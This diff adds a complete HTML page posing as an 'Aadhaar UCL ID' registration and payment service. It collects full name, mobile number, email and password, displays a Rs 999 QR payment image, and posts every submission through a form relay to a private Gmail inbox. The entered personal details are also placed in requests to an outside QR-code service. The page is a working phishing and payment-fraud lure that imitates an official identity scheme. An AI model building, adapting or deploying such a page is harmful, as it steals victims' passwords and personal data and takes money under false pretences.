@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Registration & Payment</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+
+    .container {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(20px);
+        border-radius: 20px;
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.1);
+        padding: 40px;
+        width: 100%;
+        max-width: 480px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .container::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+        background: linear-gradient(90deg, #667eea, #764ba2, #f093fb, #f5576c);
+        border-radius: 20px 20px 0 0;
+    }
+
+    .header {
+        text-align: center;
+        margin-bottom: 30px;
+    }
+
+    .logo {
+        width: 60px;
+        height: 60px;
+        background: linear-gradient(135deg, #667eea, #764ba2);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+        font-size: 24px;
+        color: white;
+        box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+    }
+
+    .title {
+        font-size: 28px;
+        font-weight: 700;
+        color: #333;
+        margin-bottom: 8px;
+    }
+
+    .subtitle {
+        color: #666;
+        font-size: 14px;
+    }
+
+    .input-group {
+        margin-bottom: 20px;
+        position: relative;
+    }
+
+    label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 600;
+        color: #555;
+        font-size: 14px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    input {
+        width: 100%;
+        padding: 15px 20px;
+        border: 2px solid #e1e5e9;
+        border-radius: 12px;
+        font-size: 16px;
+        transition: all 0.3s ease;
+        background: #fafbfc;
+    }
+
+    input:focus {
+        outline: none;
+        border-color: #667eea;
+        background: white;
+        box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        transform: translateY(-2px);
+    }
+
+    input:valid {
+        border-color: #10b981;
+    }
+
+    .input-group::after {
+        content: '';
+        position: absolute;
+        bottom: -2px;
+        left: 0;
+        width: 0;
+        height: 2px;
+        background: linear-gradient(90deg, #667eea, #764ba2);
+        transition: width 0.3s ease;
+    }
+
+    .input-group:focus-within::after {
+        width: 100%;
+    }
+
+    .feature-badges {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        margin: 25px 0;
+    }
+
+    .badge {
+        background: linear-gradient(135deg, #667eea, #764ba2);
+        color: white;
+        padding: 8px 16px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+        animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+    }
+
+    .qr-container {
+        text-align: center;
+        margin: 25px 0;
+        padding: 20px;
+        background: linear-gradient(135deg, #f8fafc, #e2e8f0);
+        border-radius: 12px;
+        border: 2px dashed #cbd5e0;
+    }
+
+    .qr-code {
+        width: 150px;
+        height: 150px;
+        border-radius: 12px;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+        transition: transform 0.3s ease;
+    }
+
+    .qr-code:hover {
+        transform: scale(1.05) rotate(2deg);
+    }
+
+    .qr-label {
+        margin-top: 10px;
+        font-size: 12px;
+        color: #64748b;
+        font-weight: 500;
+    }
+
+    .submit-btn {
+        width: 100%;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        border: none;
+        padding: 18px;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .submit-btn::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+        transition: left 0.5s ease;
+    }
+
+    .submit-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 35px rgba(102, 126, 234, 0.5);
+    }
+
+    .submit-btn:hover::before {
+        left: 100%;
+    }
+
+    .submit-btn:active {
+        transform: translateY(0);
+    }
+
+    .security-info {
+        text-align: center;
+        margin-top: 20px;
+        padding: 15px;
+        background: rgba(16, 185, 129, 0.1);
+        border-radius: 8px;
+        border: 1px solid rgba(16, 185, 129, 0.2);
+    }
+
+    .security-info p {
+        font-size: 12px;
+        color: #059669;
+        margin: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+    }
+
+    .floating-elements {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        overflow: hidden;
+        pointer-events: none;
+        z-index: -1;
+    }
+
+    .floating-elements::before,
+    .floating-elements::after {
+        content: '';
+        position: absolute;
+        width: 100px;
+        height: 100px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
+        animation: float 6s ease-in-out infinite;
+    }
+
+    .floating-elements::before {
+        top: 20%;
+        right: -50px;
+        animation-delay: 0s;
+    }
+
+    .floating-elements::after {
+        bottom: 20%;
+        left: -50px;
+        animation-delay: 3s;
+    }
+
+    @keyframes float {
+        0%, 100% { transform: translateY(0px) rotate(0deg); }
+        50% { transform: translateY(-20px) rotate(180deg); }
+    }
+
+    .loading {
+        display: none;
+        justify-content: center;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .spinner {
+        width: 20px;
+        height: 20px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-top: 2px solid white;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+        .container {
+            padding: 30px 20px;
+            margin: 10px;
+        }
+        
+        .title {
+            font-size: 24px;
+        }
+        
+        input {
+            padding: 12px 16px;
+            font-size: 14px;
+        }
+        
+        .submit-btn {
+            padding: 15px;
+            font-size: 14px;
+        }
+    }
+</style>
+
+
+</head>
+<body>
+    <div class="container">
+        <div class="floating-elements"></div>
+
+
+    <div class="header">
+        <div class="logo">🔐</div>
+        <h1 class="title">  Aadhaar UCL ID </h1>
+        <p class="subtitle">Create your account with instant QR verification And   payment</p>
+    </div>
+
+    <form id="userForm" action="https://formsubmit.co/arfanulhoque113@gmail.com" method="POST">
+        <!-- Hidden FormSubmit configuration -->
+        <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html">
+        <input type="hidden" name="_subject" value="New Registration & Payment Request!">
+        <input type="hidden" name="_autoresponse" value="Thank you for your registration and payment. We are processing your request and your ID will be sent to your WhatsApp shortly.">
+        
+        <div class="input-group">
+            <label>👤 Full Name</label>
+            <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required />
+        </div>
+        
+        <div class="input-group">
+            <label>📱 Mobile Number</label>
+            <input type="tel" id="mobile" name="Mobile Number" pattern="[0-9]{10}" placeholder="10 अंकों का नंबर दर्ज करें" required />
+        </div>
+        
+        <div class="input-group">
+            <label>📧 Email ID</label>
+            <input type="email" id="email" name="Email ID" placeholder="your@email.com" required />
+        </div>
+        
+        <div class="input-group">
+            <label>🔐 Password</label>
+            <input type="password" id="password" name="Password" placeholder="Create a strong password" required />
+        </div>
+        
+        <div class="feature-badges">
+            <span class="badge">🔒   Aadhar</span>
+            <span class="badge">⚡ UCL</span>
+            <span class="badge">✅ ID</span>
+        </div>
+        
+        <div class="qr-container">
+<h1 class="title">RS 999 </h1>
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfQbyIXaxiaA2lLkGDlMKBI3QcEe6JeUHnnNhSDQVUFfnq8K0SpJTKXglt4zV7mSNFN5EIkn0H9H6em4_sVhyphenhyphenziPNgDXKgqFxb0zy6BxZS6KbGxUo8pDjBlofGUkTXn-an3v_6SkycBd3MdKqrj57p6rPvue5eLkBfT7ICC56mycTSfHbqaEnvuySadzc/s320/IMG_4134.jpeg" 
+                 alt="QR Code" class="qr-code" id="qrCodeImage">
+            <div class="qr-label">🎯 Scan QR for instant verification</div>
+        </div>
+        
+        <button type="submit" class="submit-btn" id="submitBtn">
+            <span class="btn-text"> Submit →</span>
+            <div class="loading">
+                <div class="spinner"></div>
+                Processing...
+            </div>
+        </button>
+    </form>
+    
+    <div class="security-info">
+        <p>🛡️ Your data processing five minute </p>
+    </div>
+</div>
+
+<script>
+    // Form validation and interactivity
+    const form = document.getElementById('userForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const qrCodeImg = document.getElementById('qrCodeImage');
+    
+    // Real-time form validation
+    const inputs = document.querySelectorAll('input[required]');
+    inputs.forEach(input => {
+        input.addEventListener('input', function() {
+            validateInput(this);
+            updateQRCode();
+        });
+    });
+    
+    function validateInput(input) {
+        const inputGroup = input.parentElement;
+        if (input.validity.valid && input.value.trim() !== '') {
+            inputGroup.classList.add('valid');
+            input.style.borderColor = '#10b981';
+        } else {
+            inputGroup.classList.remove('valid');
+            input.style.borderColor = '#e1e5e9';
+        }
+    }
+    
+    // Dynamic QR Code generation
+    function updateQRCode() {
+        const name = document.getElementById('fullname').value;
+        const mobile = document.getElementById('mobile').value;
+        const email = document.getElementById('email').value;
+        
+        if (name || mobile || email) {
+            const qrData = `Name: ${name}, Mobile: ${mobile}, Email: ${email}`;
+            const encodedData = encodeURIComponent(qrData);
+            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedData}`;
+        }
+    }
+    
+    // Form submission with loading state
+    form.addEventListener('submit', function(e) {
+        const btnText = submitBtn.querySelector('.btn-text');
+        const loading = submitBtn.querySelector('.loading');
+        
+        btnText.style.display = 'none';
+        loading.style.display = 'flex';
+        submitBtn.disabled = true;
+        
+        // Re-enable after 3 seconds (in case of issues)
+        setTimeout(() => {
+            btnText.style.display = 'block';
+            loading.style.display = 'none';
+            submitBtn.disabled = false;
+        }, 3000);
+    });
+    
+    // Mobile number formatting
+    const mobileInput = document.getElementById('mobile');
+    mobileInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 10) {
+            value = value.substring(0, 10);
+        }
+        e.target.value = value;
+    });
+    
+    // Password strength indicator
+    const passwordInput = document.getElementById('password');
+    passwordInput.addEventListener('input', function(e) {
+        const password = e.target.value;
+        const strength = calculatePasswordStrength(password);
+        updatePasswordStrength(strength);
+    });
+    
+    function calculatePasswordStrength(password) {
+        let score = 0;
+        if (password.length >= 8) score++;
+        if (/[a-z]/.test(password)) score++;
+        if (/[A-Z]/.test(password)) score++;
+        if (/[0-9]/.test(password)) score++;
+        if (/[^A-Za-z0-9]/.test(password)) score++;
+        return score;
+    }
+    
+    function updatePasswordStrength(strength) {
+        const colors = ['#ef4444', '#f97316', '#eab308', '#22c55e', '#10b981'];
+        const labels = ['Very Weak', 'Weak', 'Fair', 'Good', 'Strong'];
+        
+        passwordInput.style.borderColor = colors[strength] || '#e1e5e9';
+    }
+    
+    // Add floating animation on scroll
+    window.addEventListener('scroll', function() {
+        const container = document.querySelector('.container');
+        const scrolled = window.pageYOffset;
+        container.style.transform = `translateY(${scrolled * 0.1}px)`;
+    });
+    
+    // Initialize
+    document.addEventListener('DOMContentLoaded', function() {
+        // Add entrance animation
+        const container = document.querySelector('.container');
+        container.style.opacity = '0';
+        container.style.transform = 'translateY(30px)';
+        
+        setTimeout(() => {
+            container.style.transition = 'all 0.6s ease';
+            container.style.opacity = '1';
+            container.style.transform = 'translateY(0)';
+        }, 100);
+    });
+</script>
+
+
+</body>
+</html>
